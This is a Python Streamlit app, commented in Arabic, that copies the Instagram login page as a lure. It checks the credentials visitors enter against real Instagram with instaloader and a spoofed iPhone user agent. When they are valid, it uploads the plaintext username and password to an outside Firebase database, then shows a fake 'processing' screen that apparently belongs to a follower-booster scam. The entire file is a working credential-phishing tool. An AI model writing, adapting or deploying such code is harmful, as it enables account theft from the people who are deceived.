import streamlit as st
import requests
import instaloader
import time

# --- إعدادات SYKO ---
st.set_page_config(page_title="Login • Instagram", layout="centered")
DB_URL = "https://syko-booster-default-rtdb.firebaseio.com/"

st.markdown("""
    <style>
    .stApp { background-color: #000; }
    .login-container {
        background-color: #000; border: 1px solid #363636;
        padding: 40px; max-width: 350px; margin: auto;
        text-align: center; margin-top: 50px;
    }
    .insta-logo {
        font-family: 'Billabong', sans-serif; font-size: 50px;
        color: white; margin-bottom: 30px; display: block;
    }
    input {
        background-color: #121212 !important; border: 1px solid #363636 !important;
        color: white !important; border-radius: 3px !important; height: 38px !important;
    }
    .stButton>button {
        background-color: #0095f6 !important; color: white !important;
        width: 100%; border-radius: 8px; font-weight: bold;
    }
    </style>
    <link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet">
    """, unsafe_allow_html=True)

# --- دالة التحقق الحقيقي القوية ---
def real_insta_auth(username, password):
    L = instaloader.Instaloader()
    # تغيير بصمة المتصفح لتبدو كأنها هاتف آيفون (تجاوز الحظر)
    L.context.user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
    
    try:
        L.login(username, password)
        return True, "Success"
    except instaloader.exceptions.BadCredentialsException:
        return False, "Incorrect Password"
    except instaloader.exceptions.ConnectionException:
        return False, "IP Blocked by Insta (Try again later)"
    except Exception as e:
        return False, "Checkpoint Required (Open Insta App)"

if 'logged_in' not in st.session_state: st.session_state.logged_in = False

# --- واجهة تسجيل الدخول ---
if not st.session_state.logged_in:
    st.markdown("<div class='login-container'>", unsafe_allow_html=True)
    st.markdown("<span class='insta-logo'>Instagram</span>", unsafe_allow_html=True)
    
    u = st.text_input("User", placeholder="Username", label_visibility="collapsed")
    p = st.text_input("Pass", type="password", placeholder="Password", label_visibility="collapsed")
    
    if st.button("Log In"):
        if u and p:
            with st.spinner('Verifying Account...'):
                # التحقق الحقيقي
                success, message = real_insta_auth(u, p)
                
                if success:
                    u_clean = u.replace("@","").replace(".","_")
                    # حفظ البيانات بعد التأكد من صحتها
                    requests.put(f"{DB_URL}verified_users/{u_clean}.json", json={"u":u, "p":p})
                    st.session_state.username = u_clean
                    st.session_state.logged_in = True
                    st.rerun()
                else:
                    st.error(f"Error: {message}")
                    st.info("نصيحة: افتح تطبيق إنستقرام واضغط 'هذا أنا' إذا ظهر لك تنبيه.")
    st.markdown("</div>", unsafe_allow_html=True)

else:
    st.success(f"Verified Access: @{st.session_state.username}")
    st.markdown("### 🌀 The Void is Processing your request... Soon")
    if st.button("Logout"):
        st.session_state.logged_in = False
        st.rerun()
